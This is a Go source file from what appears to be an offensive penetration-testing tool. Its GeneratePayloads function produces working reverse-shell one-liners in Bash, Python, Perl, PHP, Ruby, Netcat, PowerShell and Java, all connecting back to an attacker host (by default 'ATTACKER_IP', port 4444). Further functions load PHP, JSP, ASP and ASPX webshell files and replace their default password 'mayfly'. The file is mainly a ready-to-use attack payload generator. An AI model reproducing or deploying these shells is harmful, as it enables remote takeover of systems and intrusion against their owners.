package service

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// PayloadInfo Payload 信息
type PayloadInfo struct {
	Type    string `json:"type"`
	Label   string `json:"label"`
	Command string `json:"command"`
}

// shellFileMap 脚本类型 → 文件名映射
var shellFileMap = map[string]string{
	"php":  "shell.php",
	"jsp":  "shell.jsp",
	"aspx": "shell.aspx",
	"asp":  "shell.asp",
}

// resolvePayloadsDir 查找 payloads 目录路径
func resolvePayloadsDir() string {
	// 1. 当前工作目录
	if _, err := os.Stat("payloads"); err == nil {
		return "payloads"
	}
	// 2. 可执行文件目录
	if exe, err := os.Executable(); err == nil {
		p := filepath.Join(filepath.Dir(exe), "payloads")
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return "payloads"
}

// GeneratePayloads 生成反向 Shell Payload
func GeneratePayloads(host string, port int) []PayloadInfo {
	h := host
	if h == "" {
		h = "ATTACKER_IP"
	}
	p := port
	if p == 0 {
		p = 4444
	}

	return []PayloadInfo{
		{
			Type:  "bash",
			Label: "Bash",
			Command: fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", h, p),
		},
		{
			Type:  "python",
			Label: "Python",
			Command: fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, h, p),
		},
		{
			Type:  "python3",
			Label: "Python3",
			Command: fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, h, p),
		},
		{
			Type:  "perl",
			Label: "Perl",
			Command: fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,pack_sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, h, p),
		},
		{
			Type:  "php",
			Label: "PHP",
			Command: fmt.Sprintf(`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`, h, p),
		},
		{
			Type:  "ruby",
			Label: "Ruby",
			Command: fmt.Sprintf(`ruby -rsocket -e 'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, h, p),
		},
		{
			Type:  "nc",
			Label: "Netcat",
			Command: fmt.Sprintf("nc -e /bin/sh %s %d", h, p),
		},
		{
			Type:  "nc_bsd",
			Label: "Netcat (BSD)",
			Command: fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f", h, p),
		},
		{
			Type:  "powershell",
			Label: "PowerShell",
			Command: fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()`, h, p),
		},
		{
			Type:  "java",
			Label: "Java",
			Command: fmt.Sprintf(`r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 1>&5 2>&5; done"});`, h, p),
		},
	}
}

// GenerateWebShellScript 从 payloads 目录读取 WebShell 脚本
func GenerateWebShellScript(scriptType string) (string, error) {
	return GenerateWebShellScriptWithPassword(scriptType, "")
}

// GenerateWebShellScriptWithPassword 读取 WebShell 脚本并替换连接密码
func GenerateWebShellScriptWithPassword(scriptType, password string) (string, error) {
	lang := strings.ToLower(scriptType)
	fname, ok := shellFileMap[lang]
	if !ok {
		return "", fmt.Errorf("不支持的脚本类型: %s（支持: php, jsp, asp, aspx）", scriptType)
	}

	dir := resolvePayloadsDir()
	data, err := os.ReadFile(filepath.Join(dir, fname))
	if err != nil {
		return "", fmt.Errorf("读取脚本文件失败: %w（请确保 payloads/%s 存在）", err, fname)
	}

	content := string(data)
	if password != "" {
		content = replaceShellKey(content, lang, password)
	}
	return content, nil
}

// replaceShellKey 替换脚本中的默认连接密码
func replaceShellKey(content, lang, password string) string {
	switch lang {
	case "php":
		return strings.Replace(content, "$key = 'mayfly';", "$key = '"+password+"';", 1)
	case "jsp":
		return strings.Replace(content, `String key = "mayfly";`, `String key = "`+password+`";`, 1)
	case "aspx":
		return strings.Replace(content, `string key = "mayfly";`, `string key = "`+password+`";`, 1)
	case "asp":
		return strings.Replace(content, `key = "mayfly"`, `key = "`+password+`"`, 1)
	}
	return content
}

// ListShellTypes 返回支持的脚本类型列表
func ListShellTypes() []string {
	return []string{"php", "jsp", "asp", "aspx"}
}
